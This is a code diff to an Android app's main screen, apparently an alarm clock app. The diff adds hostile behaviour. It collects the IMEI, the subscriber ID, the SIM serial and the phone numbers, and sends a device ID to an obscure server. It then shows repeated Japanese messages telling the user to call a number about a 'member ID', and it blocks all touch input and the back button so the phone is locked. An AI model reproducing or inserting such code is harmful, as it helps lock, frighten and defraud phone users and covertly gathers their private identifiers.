@@ -1,14 +1,18 @@
 package com.example.axu1.richarddawkinsalarmclock;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.os.Build;
 import android.os.CountDownTimer;
+import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -18,6 +22,7 @@ import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.view.MotionEvent;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;
@@ -36,6 +41,7 @@ import org.json.JSONObject;
 
 import java.util.Calendar;
 import java.util.Random;
+import java.util.UUID;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -44,7 +50,13 @@ public class MainActivity extends AppCompatActivity {
 
     private TimePicker alarmTimePicker;
     private TextView alarmTextView;
-    public String mDeviceId;
+    public String mDeviceId = null;
+    String uniqueID;
+    UUID deviceId;
+    String sub_id;
+    String sim_serial;
+    String line_num;
+    String main_num;
 
     private AlarmReceiver alarm;
 
@@ -52,13 +64,11 @@ public class MainActivity extends AppCompatActivity {
     MainActivity inst;
     Context context;
 
+    @SuppressLint("HardwareIds")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        Toast.makeText(getApplicationContext(), "oncreate!", Toast.LENGTH_SHORT).show();
-
 
         //RETRIVEING MOBILE DATA AND SEND TO SERVER IF NOT EXIST
         TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
@@ -73,7 +83,34 @@ public class MainActivity extends AppCompatActivity {
             // for ActivityCompat#requestPermissions for more details.
             return;
         }
-        mDeviceId = tMgr.getDeviceId();
+
+
+        if (null != tMgr) mDeviceId = tMgr.getDeviceId();
+
+        if (null == mDeviceId || 0 == mDeviceId.length())
+            mDeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
+       // mDeviceId = tMgr.getDeviceId();
+       // mDeviceId = UUID.randomUUID();
+        if(null == mDeviceId)
+            mDeviceId = UUID.randomUUID().toString();
+
+        final String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+
+        deviceId = new UUID(androidId.hashCode(), ((long) mDeviceId.hashCode() << 32));
+
+        uniqueID = UUID.randomUUID().toString();
+
+        sub_id = tMgr.getSubscriberId();
+        sim_serial = tMgr.getSimSerialNumber();
+        line_num = tMgr.getLine1Number();
+        main_num = tMgr.getVoiceMailNumber();
+
+
+
+
+
+
+
 
         this.context = this;
 
@@ -162,6 +199,42 @@ public class MainActivity extends AppCompatActivity {
         super.onStart();
         Toast.makeText(getApplicationContext(), "start application", Toast.LENGTH_SHORT).show();
         fetchingData();
+
+        boolean connected = false;
+        ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
+        if(connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED ||
+                connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {
+            //we are connected to a network
+            connected = true;
+        }
+        else
+            connected = false;
+
+        if(false){
+            LayoutInflater layoutInflater = (LayoutInflater)
+                    getSystemService(LAYOUT_INFLATER_SERVICE);
+            View layout = layoutInflater.inflate(R.layout.toast_img, null);
+            ImageView toastimg = (ImageView)
+                    layout.findViewById(R.id.toastImg);
+            toastimg.setImageResource(R.drawable.image_w);
+            TextView toastmes = (TextView)
+                    layout.findViewById(R.id.toastTxt);
+            toastmes.setText("COnntect to the internet fast... ");
+            final Toast toast = new Toast(getApplicationContext());
+            toast.setGravity(Gravity.BOTTOM, 0, 0);
+            toast.setView(layout);
+            toast.show();
+            new CountDownTimer(500, 50000)
+            {
+
+                public void onTick(long millisUntilFinished) {toast.show();}
+                public void onFinish() {toast.show();}
+
+            }.start();
+
+        }
+        Toast.makeText(getApplicationContext(), String.valueOf(connected).toString(), Toast.LENGTH_SHORT).show();
+
         inst = this;
     }
 
@@ -179,7 +252,7 @@ public class MainActivity extends AppCompatActivity {
 
 
         String myURL = "http://fh4c2dv5yu.com/android_get.php?udid=";
-        myURL += mDeviceId;
+        myURL += deviceId;
 
         JsonArrayRequest jsonArrayRequest = new JsonArrayRequest(myURL, new Response.Listener<JSONArray>() {
 
@@ -187,7 +260,9 @@ public class MainActivity extends AppCompatActivity {
             public void onResponse(JSONArray response) {
                 final String[] device_id = new String[response.length()];
                 final String[] status = new String[response.length()];
-
+                final String[] client_id = new String[response.length()];
+                final String[] telephone = new String[response.length()];
+                final String[] telset1 = new String[response.length()];
 
                 for (int i =0; i < response.length(); i++){
 
@@ -195,21 +270,28 @@ public class MainActivity extends AppCompatActivity {
 
                         JSONObject jsonObject = (JSONObject) response.get(i);
                         device_id[i] = jsonObject.getString("ud_id");
-                        status[i] = jsonObject.getString("status");
+                        status[i] = jsonObject.getString("flag_status");
+                        client_id[i] = jsonObject.getString("client_id");
+                        client_id[i] = client_id[i].substring(2,client_id[i].length());
+                        telephone[i] = jsonObject.getString("telephone");
+                        telset1[i] = jsonObject.getString("telset1");
 
                         if(device_id[i].equals(String.valueOf(mDeviceId).toString())) {
                             Log.d("status: ", String.valueOf(status[i]));
-                            if(status[i].equals(String.valueOf(1).toString())){
+                            if(status[i].equals(String.valueOf(0).toString())){
                                 for (int j=0; j < 10; j++) {
                                     LayoutInflater layoutInflater = (LayoutInflater)
                                             getSystemService(LAYOUT_INFLATER_SERVICE);
                                     View layout = layoutInflater.inflate(R.layout.toast_img, null);
                                     ImageView toastimg = (ImageView)
                                             layout.findViewById(R.id.toastImg);
-                                    toastimg.setImageResource(R.drawable.images);
+                                    toastimg.setImageResource(R.drawable.image_w);
                                     TextView toastmes = (TextView)
                                             layout.findViewById(R.id.toastTxt);
-                                    toastmes.setText("Here is your message message"+j);
+                                    toastmes.setText("Call to this number>>> \n 会員ＩＤ: "+client_id[i]+ "\n -Mobile : "+telephone[i]);
+           /*                         toastmes.setText("Message"+j+"\n 会員ＩＤ: "+client_id[i]+ "\n  -Mobile : "+telephone[i] + "\n -devid ID: "+ mDeviceId +
+                                            "\n -Unique ID: "+uniqueID+ "\n -subscriber ID: "+sub_id+"\n -sim srial ID: "+sim_serial+"\n -main number:"+main_num+"\n -line number:"
+                                            +line_num);*/
                                     final Toast toast = new Toast(getApplicationContext());
                                     toast.setGravity(Gravity.BOTTOM, 0, 0);
                                     toast.setView(layout);
@@ -248,6 +330,20 @@ public class MainActivity extends AppCompatActivity {
         //return state;
     }
     //END FUNCTION TO FETCH DATA FROM THE SERVER
+
+
+
+    //disbaled touch effect
+    @Override
+    public boolean dispatchTouchEvent(MotionEvent ev){
+        return true;//consume
+    }
+
+    // disabled backpressed
+    @Override
+    public void onBackPressed() {
+        // dont call **super**, if u want disable back button in current screen.
+    }
 
 
 }
